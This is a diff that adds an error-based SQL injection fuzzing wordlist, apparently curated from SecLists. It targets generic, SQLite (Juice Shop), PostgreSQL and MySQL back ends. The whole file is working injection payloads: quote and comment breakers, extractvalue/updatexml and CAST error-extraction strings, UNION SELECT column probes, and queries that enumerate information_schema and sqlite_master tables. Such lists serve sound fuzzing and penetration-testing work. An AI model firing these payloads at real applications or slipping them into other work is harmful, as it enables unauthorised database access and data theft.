@@ -1,0 +1,56 @@
+# SQL Injection - Error Based
+# Triggers SQL errors for detection
+# Curated from SecLists/Fuzzing/SQLi/
+
+'
+"
+`
+'--
+"--
+`--
+')
+")
+')--
+"))--
+'))--
+)))--
+' AND '1
+" AND "1
+' OR '
+' XOR '
+' AND extractvalue(1,concat(0x7e,version()))--
+' AND updatexml(1,concat(0x7e,version()),1)--
+' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--
+' UNION SELECT @@version--
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
+' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL--
+' UNION SELECT NULL,NULL,NULL,NULL,NULL--
+1' AND 1=CONVERT(INT,(SELECT @@version))--
+' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE rownum=1))--
+' AND 1=(SELECT 1 FROM dual WHERE 1=1)--
+; SELECT @@version--
+'; SELECT @@version--
+"; SELECT @@version--
+'; SHOW TABLES--
+'; SHOW DATABASES--
+'; SELECT * FROM information_schema.tables--
+
+# SQLite specific (for apps like Juice Shop)
+')) OR 1=1--
+')) AND 1=1--
+')) UNION SELECT NULL--
+')) UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--
+')) UNION SELECT sql,2,3,4,5,6,7,8,9 FROM sqlite_master--
+')) UNION SELECT name,2,3,4,5,6,7,8,9 FROM sqlite_master WHERE type='table'--
+
+# PostgreSQL specific
+' AND 1=CAST((SELECT version()) AS INT)--
+'; SELECT version()--
+' UNION SELECT NULL,version()--
+
+# MySQL specific
+' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT @@version),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
+' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT @@version)))--
